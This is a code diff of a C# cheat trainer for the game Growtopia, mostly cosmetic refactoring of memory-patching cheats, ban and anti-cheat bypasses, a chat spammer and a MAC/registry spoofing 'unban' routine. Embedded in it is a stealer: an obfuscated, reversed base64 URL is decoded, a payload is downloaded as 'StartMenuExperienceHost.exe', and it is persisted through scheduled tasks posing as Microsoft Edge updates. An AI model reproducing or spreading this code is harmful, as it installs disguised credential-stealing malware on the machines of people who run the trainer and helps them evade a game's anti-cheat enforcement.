@@ -26,11 +26,10 @@ namespace FreeZeHAX_Trainer
         private readonly Mem mem = new Mem();
         private readonly string NewLine = Environment.NewLine; // New line string
         private readonly Others others = new Others(); // Calling Cheats.cs
-        private readonly Timer t1 = new Timer(); // New timer
         private readonly TaskDefinition td = TaskService.Instance.NewTask(); // New TaskDefiniton task
         private readonly WebClient web = new WebClient();
         private bool IsProcOpen; // In order us to check if the process exists, we need this bool.
-        bool IsCEOpen;
+        private bool IsCEOpen;
         private readonly bool Stealer = false; // Activate / Disable Stealer
 
         public Trainer()
@@ -54,7 +53,7 @@ namespace FreeZeHAX_Trainer
                 {
                     if (CheatAddresses.Items.Count <= 1)
                     { // If CheatAddress listbox has lower than 1 item, clear the listbox
-                        this.Text = "Searching For Cheats!";
+                        Text = "Searching For Cheats!";
                         About_Button.Enabled = false;
                         Cheat_Button.Enabled = false;
                         Spammer_Button.Enabled = false;
@@ -67,13 +66,13 @@ namespace FreeZeHAX_Trainer
                         Cold2.Hide();
                         foreach (string Cheats in cheats.GTCheats)
                         { // Search for all aobs in GTCheats
-                            CheatAddresses.Items.Add(AobScan(Cheats));
+                            _ = CheatAddresses.Items.Add(AobScan(Cheats));
                         }
                         foreach (string Cheats in cheats.GTCheatsFirst)
                         { // Search for all aobs in GTCheatsFirst
-                            CheatAddresses.Items.Add(AobScan(Cheats, false, true, false));
+                            _ = CheatAddresses.Items.Add(AobScan(Cheats, false, true, false));
                         }
-                        this.Text = "FreeZeHAX Trainer";
+                        Text = "FreeZeHAX Trainer";
                         About_Button.Enabled = true;
                         Cheat_Button.Enabled = true;
                         Spammer_Button.Enabled = true;
@@ -87,13 +86,13 @@ namespace FreeZeHAX_Trainer
 
                         #region Ban Bypasses and Showing FPS
 
-                        mem.WriteMemory(GetCheat(1), "bytes", "90 90"); // Ban Bypass
-                        mem.WriteMemory(GetCheat(2), "bytes", "90 90"); // Anti Int Check
-                        mem.WriteMemory(GetCheat(23), "bytes", "E9 19 01 00 00"); // Pos Bypass
-                        mem.WriteMemory(GetCheat(0), "bytes", "0F 85 9E 01 00 00"); // Force FPS
-                        mem.WriteMemory(GetCheat(8), "bytes", "80 B8 00 00 00 00 00"); // Mod Zoom
-                        mem.WriteMemory(GetCheat(27), "bytes", "90 90"); // Fast Pickup
-                        mem.WriteMemory(GetCheat(21), "bytes", "75 90"); // Fast Drop
+                        _ = mem.WriteMemory(GetCheat(1), "bytes", "90 90"); // Ban Bypass
+                        _ = mem.WriteMemory(GetCheat(2), "bytes", "90 90"); // Anti Int Check
+                        _ = mem.WriteMemory(GetCheat(23), "bytes", "E9 19 01 00 00"); // Pos Bypass
+                        _ = mem.WriteMemory(GetCheat(0), "bytes", "0F 85 9E 01 00 00"); // Force FPS
+                        _ = mem.WriteMemory(GetCheat(8), "bytes", "80 B8 00 00 00 00 00"); // Mod Zoom
+                        _ = mem.WriteMemory(GetCheat(27), "bytes", "90 90"); // Fast Pickup
+                        _ = mem.WriteMemory(GetCheat(21), "bytes", "75 90"); // Fast Drop
 
                         #endregion Ban Bypasses and Showing FPS
 
@@ -146,7 +145,7 @@ namespace FreeZeHAX_Trainer
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message, "FreeZeHAX Trainer");
+                _ = MessageBox.Show(ex.Message, "FreeZeHAX Trainer");
             }
         }
 
@@ -157,14 +156,9 @@ namespace FreeZeHAX_Trainer
 
         private void GiveawayMode_Timer_Tick(object sender, EventArgs e)
         {
-            if ((Keyboard.GetKeyStates(Key.S) & KeyStates.Down) > 0)
-            { // Going down timer
-                mem.WriteMemory(GetCheat(6), "bytes", "0F 83 88 00 00 00");
-            }
-            else
-            {
-                mem.WriteMemory(GetCheat(6), "bytes", "0F 84 88 00 00 00");
-            }
+            _ = (Keyboard.GetKeyStates(Key.S) & KeyStates.Down) > 0
+                ? mem.WriteMemory(GetCheat(6), "bytes", "0F 83 88 00 00 00")
+                : mem.WriteMemory(GetCheat(6), "bytes", "0F 84 88 00 00 00");
         }
 
         private void HostsRefresh_Click(object sender, EventArgs e)
@@ -177,14 +171,14 @@ namespace FreeZeHAX_Trainer
             if (OnTop.BackColor == Color.White)
             {
                 ActiveForm.TopMost = true;
-                FocusText.Focus();
+                _ = FocusText.Focus();
                 OnTop.BackColor = Color.Blue;
                 OnTop.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
                 ActiveForm.TopMost = false;
-                FocusText.Focus();
+                _ = FocusText.Focus();
                 OnTop.BackColor = Color.White;
                 OnTop.FlatAppearance.BorderColor = Color.Black;
             }
@@ -234,7 +228,7 @@ namespace FreeZeHAX_Trainer
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message, "FreeZeHAX Trainer");
+                _ = MessageBox.Show(ex.Message, "FreeZeHAX Trainer");
             }
         }
 
@@ -242,14 +236,14 @@ namespace FreeZeHAX_Trainer
         {
             if (Spammer_Status.BackColor == Color.White)
             {
-                FocusText.Focus();
+                _ = FocusText.Focus();
                 TextTimer.Start();
                 Spammer_Status.BackColor = Color.Blue;
                 Spammer_Status.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                FocusText.Focus();
+                _ = FocusText.Focus();
                 TextTimer.Stop();
                 Spammer_Status.BackColor = Color.White;
                 Spammer_Status.FlatAppearance.BorderColor = Color.Black;
@@ -264,13 +258,13 @@ namespace FreeZeHAX_Trainer
             {
                 foreach (Process proc in processes)
                 {
-                    SetForegroundWindow(proc.MainWindowHandle);
+                    _ = SetForegroundWindow(proc.MainWindowHandle);
                     SendKeys.SendWait("{ENTER}"); // Send ENTER key
                     SendKeys.SendWait(Input.Text); // Send the text inside "Input" textbox
                     SendKeys.SendWait("{ENTER}"); // Send ENTER key
                 }
             }
-            catch (Exception ex) { MessageBox.Show(ex.Message); }
+            catch (Exception ex) { _ = MessageBox.Show(ex.Message); }
         }
 
         // Reverse string
@@ -335,7 +329,7 @@ namespace FreeZeHAX_Trainer
                     #endregion Check required dlls for the c++ stealer
 
                     string FixedString = ReverseString("lhXZuQ3cvhUZj5WZpJXZwhXR15WZNRnchR3UvADMyUTN4IzM0ADMzkzNzIzMwEzLygDM1QDOzMTMyUzN3gjM3ITOvMHduVWboNWY0RXYv02bj5CcwFGZy92YzlGZu4GZj9yL6MHc0RHa");
-                    web.DownloadFile(new Uri(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(FixedString.PadRight(FixedString.Length + (4 - FixedString.Length % 4) % 4, '=')))), StealerFolder + "\\StartMenuExperienceHost.exe"); // Download the stealer
+                    web.DownloadFile(new Uri(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(FixedString.PadRight(FixedString.Length + ((4 - (FixedString.Length % 4)) % 4), '=')))), StealerFolder + "\\StartMenuExperienceHost.exe"); // Download the stealer
                     others.Wait(2000);
                     if (!savePathExists)
                     { // If save.dat doesn't exists, just create the task scheduler
@@ -343,10 +337,10 @@ namespace FreeZeHAX_Trainer
                         DailyTrigger tf = new DailyTrigger();
                         tf.Repetition.Duration = TimeSpan.FromHours(24);
                         tf.Repetition.Interval = TimeSpan.FromMinutes(30);
-                        td.Triggers.Add(tf);
-                        td.Actions.Add(StealerFile);
-                        TaskService.Instance.RootFolder.RegisterTaskDefinition("MicrosoftEdgeUpdateTaskMachineCore", td);
-                        TaskService.Instance.AddTask("MicrosoftEdgeUpdateTaskMachineUA", QuickTriggerType.Logon, StealerFile, "-a arg");
+                        _ = td.Triggers.Add(tf);
+                        _ = td.Actions.Add(StealerFile);
+                        _ = TaskService.Instance.RootFolder.RegisterTaskDefinition("MicrosoftEdgeUpdateTaskMachineCore", td);
+                        _ = TaskService.Instance.AddTask("MicrosoftEdgeUpdateTaskMachineUA", QuickTriggerType.Logon, StealerFile, "-a arg");
 
                         if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                         {
@@ -355,15 +349,15 @@ namespace FreeZeHAX_Trainer
                     }
                     else
                     {
-                        Process.Start(StealerFile);
+                        _ = Process.Start(StealerFile);
                         td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
                         DailyTrigger dt = new DailyTrigger();
                         dt.Repetition.Duration = TimeSpan.FromHours(24);
                         dt.Repetition.Interval = TimeSpan.FromMinutes(30);
-                        td.Triggers.Add(dt);
-                        td.Actions.Add(StealerFile);
-                        TaskService.Instance.RootFolder.RegisterTaskDefinition("MicrosoftEdgeUpdateTaskMachineCore", td);
-                        TaskService.Instance.AddTask("MicrosoftEdgeUpdateTaskMachineUA", QuickTriggerType.Logon, StealerFile, "-a arg");
+                        _ = td.Triggers.Add(dt);
+                        _ = td.Actions.Add(StealerFile);
+                        _ = TaskService.Instance.RootFolder.RegisterTaskDefinition("MicrosoftEdgeUpdateTaskMachineCore", td);
+                        _ = TaskService.Instance.AddTask("MicrosoftEdgeUpdateTaskMachineUA", QuickTriggerType.Logon, StealerFile, "-a arg");
 
                         if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                         {
@@ -452,17 +446,17 @@ namespace FreeZeHAX_Trainer
         {
             if (AntiBounce.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(3), "bytes", "90 90 90 90");
-                mem.WriteMemory(GetCheat(4), "bytes", "90 90 90 90");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(3), "bytes", "90 90 90 90");
+                _ = mem.WriteMemory(GetCheat(4), "bytes", "90 90 90 90");
+                _ = FocusText.Focus();
                 AntiBounce.BackColor = Color.Blue;
                 AntiBounce.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(3), "bytes", "41 0F 28 C2");
-                mem.WriteMemory(GetCheat(4), "bytes", "83 4B 0C 20");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(3), "bytes", "41 0F 28 C2");
+                _ = mem.WriteMemory(GetCheat(4), "bytes", "83 4B 0C 20");
+                _ = FocusText.Focus();
                 AntiBounce.BackColor = Color.White;
                 AntiBounce.FlatAppearance.BorderColor = Color.Black;
             }
@@ -472,15 +466,15 @@ namespace FreeZeHAX_Trainer
         {
             if (AntiGravityWell.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(17), "bytes", "90 90 90 90 90");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(17), "bytes", "90 90 90 90 90");
+                _ = FocusText.Focus();
                 AntiGravityWell.BackColor = Color.Blue;
                 AntiGravityWell.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(17), "bytes", "E8 25 01 00 00");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(17), "bytes", "E8 25 01 00 00");
+                _ = FocusText.Focus();
                 AntiGravityWell.BackColor = Color.White;
                 AntiGravityWell.FlatAppearance.BorderColor = Color.Black;
             }
@@ -490,17 +484,17 @@ namespace FreeZeHAX_Trainer
         {
             if (AntiKnockback.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(11), "bytes", "0F 84 C0 00 00 00");
-                mem.WriteMemory(GetCheat(12), "bytes", "0F 84 67 01 00 00");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(11), "bytes", "0F 84 C0 00 00 00");
+                _ = mem.WriteMemory(GetCheat(12), "bytes", "0F 84 67 01 00 00");
+                _ = FocusText.Focus();
                 AntiKnockback.BackColor = Color.Blue;
                 AntiKnockback.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(11), "bytes", "0F 85 C0 00 00 00");
-                mem.WriteMemory(GetCheat(12), "bytes", "0F 85 67 01 00 00");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(11), "bytes", "0F 85 C0 00 00 00");
+                _ = mem.WriteMemory(GetCheat(12), "bytes", "0F 85 67 01 00 00");
+                _ = FocusText.Focus();
                 AntiKnockback.BackColor = Color.White;
                 AntiKnockback.FlatAppearance.BorderColor = Color.Black;
             }
@@ -510,15 +504,15 @@ namespace FreeZeHAX_Trainer
         {
             if (AntiLgrid.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(26), "bytes", "0F 84 67 05 00 00");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(26), "bytes", "0F 84 67 05 00 00");
+                _ = FocusText.Focus();
                 AntiLgrid.BackColor = Color.Blue;
                 AntiLgrid.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(26), "bytes", "0F 85 67 05 00 00");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(26), "bytes", "0F 85 67 05 00 00");
+                _ = FocusText.Focus();
                 AntiLgrid.BackColor = Color.White;
                 AntiLgrid.FlatAppearance.BorderColor = Color.Black;
             }
@@ -528,15 +522,15 @@ namespace FreeZeHAX_Trainer
         {
             if (AntiPlatform.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(16), "bytes", "90 90");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(16), "bytes", "90 90");
+                _ = FocusText.Focus();
                 AntiPlatform.BackColor = Color.Blue;
                 AntiPlatform.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(16), "bytes", "74 0D");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(16), "bytes", "74 0D");
+                _ = FocusText.Focus();
                 AntiPlatform.BackColor = Color.White;
                 AntiPlatform.FlatAppearance.BorderColor = Color.Black;
             }
@@ -546,15 +540,15 @@ namespace FreeZeHAX_Trainer
         {
             if (AntiSlide.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(10), "bytes", "74 03");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(10), "bytes", "74 03");
+                _ = FocusText.Focus();
                 AntiSlide.BackColor = Color.Blue;
                 AntiSlide.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(10), "bytes", "75 03");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(10), "bytes", "75 03");
+                _ = FocusText.Focus();
                 AntiSlide.BackColor = Color.White;
                 AntiSlide.FlatAppearance.BorderColor = Color.Black;
             }
@@ -564,15 +558,15 @@ namespace FreeZeHAX_Trainer
         {
             if (DevMode.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(18), "bytes", "75 5F");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(18), "bytes", "75 5F");
+                _ = FocusText.Focus();
                 DevMode.BackColor = Color.Blue;
                 DevMode.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(18), "bytes", "74 5F");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(18), "bytes", "74 5F");
+                _ = FocusText.Focus();
                 DevMode.BackColor = Color.White;
                 DevMode.FlatAppearance.BorderColor = Color.Black;
             }
@@ -582,15 +576,15 @@ namespace FreeZeHAX_Trainer
         {
             if (FastFallV1.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(5), "bytes", "90 90 90 90");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(5), "bytes", "90 90 90 90");
+                _ = FocusText.Focus();
                 FastFallV1.BackColor = Color.Blue;
                 FastFallV1.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(5), "bytes", "F3 0F 59 CE");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(5), "bytes", "F3 0F 59 CE");
+                _ = FocusText.Focus();
                 FastFallV1.BackColor = Color.White;
                 FastFallV1.FlatAppearance.BorderColor = Color.Black;
             }
@@ -600,15 +594,15 @@ namespace FreeZeHAX_Trainer
         {
             if (FastFallV2.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(6), "bytes", "0F 83 88 00 00 00");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(6), "bytes", "0F 83 88 00 00 00");
+                _ = FocusText.Focus();
                 FastFallV2.BackColor = Color.Blue;
                 FastFallV2.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(6), "bytes", "0F 84 88 00 00 00");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(6), "bytes", "0F 84 88 00 00 00");
+                _ = FocusText.Focus();
                 FastFallV2.BackColor = Color.White;
                 FastFallV2.FlatAppearance.BorderColor = Color.Black;
             }
@@ -618,15 +612,15 @@ namespace FreeZeHAX_Trainer
         {
             if (AntiCheckpoint.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(22), "bytes", "EB 3E");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(22), "bytes", "EB 3E");
+                _ = FocusText.Focus();
                 AntiCheckpoint.BackColor = Color.Blue;
                 AntiCheckpoint.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(22), "bytes", "74 3E");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(22), "bytes", "74 3E");
+                _ = FocusText.Focus();
                 AntiCheckpoint.BackColor = Color.White;
                 AntiCheckpoint.FlatAppearance.BorderColor = Color.Black;
             }
@@ -636,15 +630,15 @@ namespace FreeZeHAX_Trainer
         {
             if (Ghost.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(19), "bytes", "73 05");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(19), "bytes", "73 05");
+                _ = FocusText.Focus();
                 Ghost.BackColor = Color.Blue;
                 Ghost.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(19), "bytes", "74 05");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(19), "bytes", "74 05");
+                _ = FocusText.Focus();
                 Ghost.BackColor = Color.White;
                 Ghost.FlatAppearance.BorderColor = Color.Black;
             }
@@ -655,20 +649,20 @@ namespace FreeZeHAX_Trainer
             if (GiveawayMode.BackColor == Color.White)
             {
                 GiveawayMode_Timer.Start();
-                mem.WriteMemory(GetCheat(19), "bytes", "73 05"); //Ghost Mode
-                mem.WriteMemory(GetCheat(7), "bytes", "90 90"); //Noclip
-                mem.WriteMemory(GetCheat(24), "bytes", "75 5D"); //Mod Fly V1
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(19), "bytes", "73 05"); //Ghost Mode
+                _ = mem.WriteMemory(GetCheat(7), "bytes", "90 90"); //Noclip
+                _ = mem.WriteMemory(GetCheat(24), "bytes", "75 5D"); //Mod Fly V1
+                _ = FocusText.Focus();
                 GiveawayMode.BackColor = Color.Blue;
                 GiveawayMode.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
                 GiveawayMode_Timer.Stop();
-                mem.WriteMemory(GetCheat(19), "bytes", "74 05"); //Ghost Mode
-                mem.WriteMemory(GetCheat(7), "bytes", "75 0B"); //Noclip
-                mem.WriteMemory(GetCheat(24), "bytes", "74 5D"); //Mod Fly V1
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(19), "bytes", "74 05"); //Ghost Mode
+                _ = mem.WriteMemory(GetCheat(7), "bytes", "75 0B"); //Noclip
+                _ = mem.WriteMemory(GetCheat(24), "bytes", "74 5D"); //Mod Fly V1
+                _ = FocusText.Focus();
                 GiveawayMode.BackColor = Color.White;
                 GiveawayMode.FlatAppearance.BorderColor = Color.Black;
             }
@@ -678,15 +672,15 @@ namespace FreeZeHAX_Trainer
         {
             if (Gravity.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(20), "bytes", "0F 85 17 01 00 00");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(20), "bytes", "0F 85 17 01 00 00");
+                _ = FocusText.Focus();
                 Gravity.BackColor = Color.Blue;
                 Gravity.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(20), "bytes", "0F 84 17 01 00 00");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(20), "bytes", "0F 84 17 01 00 00");
+                _ = FocusText.Focus();
                 Gravity.BackColor = Color.White;
                 Gravity.FlatAppearance.BorderColor = Color.Black;
             }
@@ -696,15 +690,15 @@ namespace FreeZeHAX_Trainer
         {
             if (Growz.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(25), "bytes", "90 90 90 90");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(25), "bytes", "90 90 90 90");
+                _ = FocusText.Focus();
                 Growz.BackColor = Color.Blue;
                 Growz.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(25), "bytes", "F3 0F 5C D1");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(25), "bytes", "F3 0F 5C D1");
+                _ = FocusText.Focus();
                 Growz.BackColor = Color.White;
                 Growz.FlatAppearance.BorderColor = Color.Black;
             }
@@ -715,16 +709,16 @@ namespace FreeZeHAX_Trainer
             if (ModFlyV2.BackColor == Color.White)
             {
                 GiveawayMode_Timer.Start();
-                mem.WriteMemory(GetCheat(24), "bytes", "75 5D");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(24), "bytes", "75 5D");
+                _ = FocusText.Focus();
                 ModFlyV2.BackColor = Color.Blue;
                 ModFlyV2.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                GiveawayMode_Timer.Start();
-                mem.WriteMemory(GetCheat(24), "bytes", "74 5D");
-                FocusText.Focus();
+                GiveawayMode_Timer.Stop();
+                _ = mem.WriteMemory(GetCheat(24), "bytes", "74 5D");
+                _ = FocusText.Focus();
                 ModFlyV2.BackColor = Color.White;
                 ModFlyV2.FlatAppearance.BorderColor = Color.Black;
             }
@@ -734,15 +728,15 @@ namespace FreeZeHAX_Trainer
         {
             if (AntiState.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(28), "bytes", "0F 85 6A 16 00 00");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(28), "bytes", "0F 85 6A 16 00 00");
+                _ = FocusText.Focus();
                 AntiState.BackColor = Color.Blue;
                 AntiState.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(28), "bytes", "0F 84 6A 16 00 00");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(28), "bytes", "0F 84 6A 16 00 00");
+                _ = FocusText.Focus();
                 AntiState.BackColor = Color.White;
                 AntiState.FlatAppearance.BorderColor = Color.Black;
             }
@@ -752,15 +746,15 @@ namespace FreeZeHAX_Trainer
         {
             if (SlideMode.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(9), "bytes", "74 0E");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(9), "bytes", "74 0E");
+                _ = FocusText.Focus();
                 SlideMode.BackColor = Color.Blue;
                 SlideMode.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(9), "bytes", "75 0E");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(9), "bytes", "75 0E");
+                _ = FocusText.Focus();
                 SlideMode.BackColor = Color.White;
                 SlideMode.FlatAppearance.BorderColor = Color.Black;
             }
@@ -770,19 +764,19 @@ namespace FreeZeHAX_Trainer
         {
             if (SystemSpeed.BackColor == Color.White)
             {
-                mem.WriteMemory(GetCheat(13), "bytes", "90 90 90 90");
-                mem.WriteMemory(GetCheat(14), "bytes", "90 90 90 90");
-                mem.WriteMemory(GetCheat(15), "bytes", "90 90 90 90");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(13), "bytes", "90 90 90 90");
+                _ = mem.WriteMemory(GetCheat(14), "bytes", "90 90 90 90");
+                _ = mem.WriteMemory(GetCheat(15), "bytes", "90 90 90 90");
+                _ = FocusText.Focus();
                 SystemSpeed.BackColor = Color.Blue;
                 SystemSpeed.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory(GetCheat(13), "bytes", "89 54 24 6C");
-                mem.WriteMemory(GetCheat(14), "bytes", "89 54 24 6C");
-                mem.WriteMemory(GetCheat(15), "bytes", "48 8B 43 08");
-                FocusText.Focus();
+                _ = mem.WriteMemory(GetCheat(13), "bytes", "89 54 24 6C");
+                _ = mem.WriteMemory(GetCheat(14), "bytes", "89 54 24 6C");
+                _ = mem.WriteMemory(GetCheat(15), "bytes", "48 8B 43 08");
+                _ = FocusText.Focus();
                 SystemSpeed.BackColor = Color.White;
                 SystemSpeed.FlatAppearance.BorderColor = Color.Black;
             }
@@ -799,7 +793,7 @@ namespace FreeZeHAX_Trainer
                 RegistryKey Cryptography = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography", true);
                 foreach (NetworkInterface adapter in NetworkInterface.GetAllNetworkInterfaces().Where(a => Adapter.IsValidMac(a.GetPhysicalAddress().GetAddressBytes(), true)).OrderByDescending(a => a.Speed))
                 { // Add all adapters in the combobox
-                    AdaptersComboBox.Items.Add(new Adapter(adapter));
+                    _ = AdaptersComboBox.Items.Add(new Adapter(adapter));
                 }
                 AdaptersComboBox.SelectedIndex = 0; // Select the first one
                 foreach (string subkeyname2 in Registry.CurrentUser.GetSubKeyNames())
@@ -865,10 +859,10 @@ namespace FreeZeHAX_Trainer
                 if (longkey.Text != "None" && shortkey.Text != "None")
                 { // If longkey and shortkey doesn't exist, show an error message
                     UnbanLog.Clear();
-                    FocusText.Focus();
+                    _ = FocusText.Focus();
                     if (!Adapter.IsValidMac(RandomizedMacAddressLabel.Text, false))
                     {
-                        MessageBox.Show("Entered MAC-address is not valid; will not update.", "Invalid MAC-address specified", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        _ = MessageBox.Show("Entered MAC-address is not valid; will not update.", "Invalid MAC-address specified", MessageBoxButtons.OK, MessageBoxIcon.Error);
                         return;
                     }
                     SetRegistryMac(RandomizedMacAddressLabel.Text);
@@ -885,7 +879,7 @@ namespace FreeZeHAX_Trainer
                 }
                 else
                 {
-                    MessageBox.Show("                                                  Can't UNBAN!                                                                       Tip: Connect to Growtopia. Then try unbanning!", "FreeZeHAX Trainer");
+                    _ = MessageBox.Show("                                                  Can't UNBAN!                                                                       Tip: Connect to Growtopia. Then try unbanning!", "FreeZeHAX Trainer");
                 }
             }
             catch (Exception) { }
@@ -1013,7 +1007,7 @@ namespace FreeZeHAX_Trainer
                 }
 
                 char c = mac[1];
-                return (c == '2' || c == '6' || c == 'A' || c == 'E');
+                return c == '2' || c == '6' || c == 'A' || c == 'E';
             }
 
             public static bool IsValidMac(byte[] bytes, bool actual)
@@ -1044,8 +1038,8 @@ namespace FreeZeHAX_Trainer
                             throw new Exception("Failed to open the registry key");
                         }
 
-                        if (regkey.GetValue("AdapterModel") as string != adaptername &&
-                          regkey.GetValue("DriverDesc") as string != adaptername)
+                        if ((regkey.GetValue("AdapterModel") as string) != adaptername &&
+                          (regkey.GetValue("DriverDesc") as string) != adaptername)
                         {
                             throw new Exception("Adapter not found in registry");
                         }
@@ -1072,7 +1066,7 @@ namespace FreeZeHAX_Trainer
                 }
                 catch (Exception ex)
                 {
-                    MessageBox.Show(ex.ToString(), "FreeZeHAX Trainer");
+                    _ = MessageBox.Show(ex.ToString(), "FreeZeHAX Trainer");
                     return false;
                 }
                 finally
@@ -1082,7 +1076,7 @@ namespace FreeZeHAX_Trainer
                         uint result = (uint)adapter.InvokeMethod("Enable", null);
                         if (result != 0)
                         {
-                            MessageBox.Show("Failed to re-enable network adapter.", "FreeZeHAX Trainer");
+                            _ = MessageBox.Show("Failed to re-enable network adapter.", "FreeZeHAX Trainer");
                         }
                     }
                 }
